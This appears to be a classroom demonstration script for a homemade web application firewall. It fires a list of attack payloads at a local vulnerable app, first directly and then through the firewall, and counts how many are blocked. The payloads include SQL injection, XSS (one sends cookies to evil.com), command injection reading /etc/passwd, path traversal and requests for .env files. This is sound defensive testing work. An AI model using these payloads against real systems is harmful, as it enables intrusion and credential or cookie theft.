"""
Digi Save WAF - Professor Demonstration Script
================================================
Automated attack simulation that proves:
 1. Attacks SUCCEED when hitting the demo app directly (Port 8090)
 2. Attacks are BLOCKED when going through the WAF proxy (Port 8085)

Usage:
  1. Start the WAF:      cd backend && python main.py
  2. Start the demo app: cd demo_target && python app.py
  3. Register demo.local in the WAF Sites page -> upstream http://127.0.0.1:8090
  4. Run this script:    python professor_demo.py
"""
import httpx
import time
import sys

DEMO_URL = "http://127.0.0.1:8090"
WAF_URL  = "http://127.0.0.1:8085"
WAF_HOST = {"Host": "demo.local"}

ATTACKS = [
    # --- OWASP Top 10 Coverage ---
    {
        "name": "SQL Injection (Union-Based)",
        "method": "GET",
        "path": "/user-lookup",
        "params": {"id": "1 UNION SELECT 1,username,password,email,role FROM users"},
    },
    {
        "name": "SQL Injection (Boolean Blind)",
        "method": "GET",
        "path": "/user-lookup",
        "params": {"id": "1 OR 1=1"},
    },
    {
        "name": "SQL Injection (Error-Based)",
        "method": "GET",
        "path": "/user-lookup",
        "params": {"id": "1' AND (SELECT 1 FROM(SELECT COUNT(*),CONCAT(version(),0x3a,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.tables GROUP BY x)a)--"},
    },
    {
        "name": "Reflected XSS (<script>)",
        "method": "GET",
        "path": "/search",
        "params": {"q": "<script>alert(document.cookie)</script>"},
    },
    {
        "name": "Reflected XSS (img onerror)",
        "method": "GET",
        "path": "/search",
        "params": {"q": '<img src=x onerror="alert(1)">'},
    },
    {
        "name": "Reflected XSS (svg onload)",
        "method": "GET",
        "path": "/search",
        "params": {"q": '<svg/onload=alert("XSS")>'},
    },
    {
        "name": "Stored XSS (Comment Injection)",
        "method": "POST",
        "path": "/comments",
        "data": {"author": "hacker", "body": "<script>document.location='http://evil.com/steal?c='+document.cookie</script>"},
    },
    {
        "name": "OS Command Injection (Semicolon)",
        "method": "GET",
        "path": "/ping",
        "params": {"ip": "127.0.0.1; cat /etc/passwd"},
    },
    {
        "name": "OS Command Injection (Pipe)",
        "method": "GET",
        "path": "/ping",
        "params": {"ip": "127.0.0.1 | whoami"},
    },
    {
        "name": "Path Traversal (Linux /etc/passwd)",
        "method": "GET",
        "path": "/file",
        "params": {"name": "../../../../../../etc/passwd"},
    },
    {
        "name": "Path Traversal (Windows win.ini)",
        "method": "GET",
        "path": "/file",
        "params": {"name": "..\\..\\..\\..\\windows\\win.ini"},
    },
    {
        "name": "SSTI (Template Injection)",
        "method": "GET",
        "path": "/template",
        "params": {"name": "{{7*7}}"},
    },
    {
        "name": "Sensitive File Access (.env)",
        "method": "GET",
        "path": "/.env",
        "params": {},
    },
    {
        "name": "Sensitive File Access (backup.sql)",
        "method": "GET",
        "path": "/backup.sql",
        "params": {},
    },
    {
        "name": "Scanner Bot Detection (sqlmap UA)",
        "method": "GET",
        "path": "/",
        "params": {},
        "headers": {"User-Agent": "sqlmap/1.5.8#dev (http://sqlmap.org)"},
    },
    {
        "name": "Scanner Bot Detection (Nikto UA)",
        "method": "GET",
        "path": "/",
        "params": {},
        "headers": {"User-Agent": "Mozilla/5.0 (Nikto/2.1.6)"},
    },
]

SEPARATOR = "-" * 60

def print_header(text):
    print(f"\n{'=' * 60}")
    print(f"  {text}")
    print(f"{'=' * 60}\n")

def run_attack(client, base_url, atk, extra_headers=None):
    headers = {}
    if extra_headers:
        headers.update(extra_headers)
    if "headers" in atk:
        headers.update(atk["headers"])

    method = atk.get("method", "GET")
    url = f"{base_url}{atk['path']}"
    params = atk.get("params", {})
    data = atk.get("data", None)

    start = time.time()
    try:
        if method == "POST":
            resp = client.post(url, data=data, headers=headers, follow_redirects=True)
        else:
            resp = client.get(url, params=params, headers=headers)
        elapsed = (time.time() - start) * 1000
        return resp.status_code, elapsed, resp.text[:150]
    except Exception as e:
        elapsed = (time.time() - start) * 1000
        return None, elapsed, str(e)

def run_phase(title, base_url, extra_headers=None):
    print_header(title)
    blocked = 0
    passed = 0
    errors = 0

    with httpx.Client(timeout=10.0) as client:
        for atk in ATTACKS:
            print(f"  Testing: {atk['name']}")
            code, ms, snippet = run_attack(client, base_url, atk, extra_headers)

            if code is None:
                print(f"    [ERROR] Connection failed: {snippet}")
                errors += 1
            elif code == 403:
                print(f"    [BLOCKED] 403 Forbidden - {ms:.1f}ms")
                blocked += 1
            elif code == 200:
                print(f"    [PASSED]  200 OK - {ms:.1f}ms")
                passed += 1
            else:
                print(f"    [OTHER]   {code} - {ms:.1f}ms")
                passed += 1

            print(SEPARATOR)
            time.sleep(0.3)

    return blocked, passed, errors

# =========================================================================
# Main
# =========================================================================
if __name__ == "__main__":
    print("\n" + "*" * 60)
    print("  DIGI SAVE WAF - PROFESSOR DEMONSTRATION SUITE")
    print("  Automated Attack Simulation & Defense Verification")
    print("*" * 60)

    # Phase 1 -- Direct attack (should all pass / be vulnerable)
    b1, p1, e1 = run_phase(
        "[PHASE 1] DIRECT ATTACK ON VULNERABLE APP (PORT 8090)",
        DEMO_URL
    )

    # Phase 2 -- Attack through WAF (should all be blocked)
    b2, p2, e2 = run_phase(
        "[PHASE 2] ATTACK THROUGH DIGI SAVE WAF (PORT 8085)",
        WAF_URL,
        extra_headers=WAF_HOST
    )

    # Summary
    print("\n" + "=" * 60)
    print("  FINAL RESULTS SUMMARY")
    print("=" * 60)
    print(f"\n  PHASE 1 - Direct (No WAF Protection):")
    print(f"    Attacks that succeeded:  {p1}/{len(ATTACKS)}")
    print(f"    Attacks blocked:         {b1}/{len(ATTACKS)}")
    if e1: print(f"    Connection errors:       {e1}")

    print(f"\n  PHASE 2 - Through Digi Save WAF:")
    print(f"    Attacks that succeeded:  {p2}/{len(ATTACKS)}")
    print(f"    Attacks blocked:         {b2}/{len(ATTACKS)}")
    if e2: print(f"    Connection errors:       {e2}")

    detection_rate = (b2 / len(ATTACKS)) * 100 if len(ATTACKS) > 0 else 0
    print(f"\n  WAF Detection Rate: {detection_rate:.1f}%")

    if detection_rate >= 90:
        print("\n  [VERDICT] Digi Save WAF provides INDUSTRY-GRADE protection.")
    elif detection_rate >= 70:
        print("\n  [VERDICT] Digi Save WAF provides STRONG protection.")
    else:
        print("\n  [VERDICT] Further tuning recommended.")

    print("\n" + "=" * 60 + "\n")
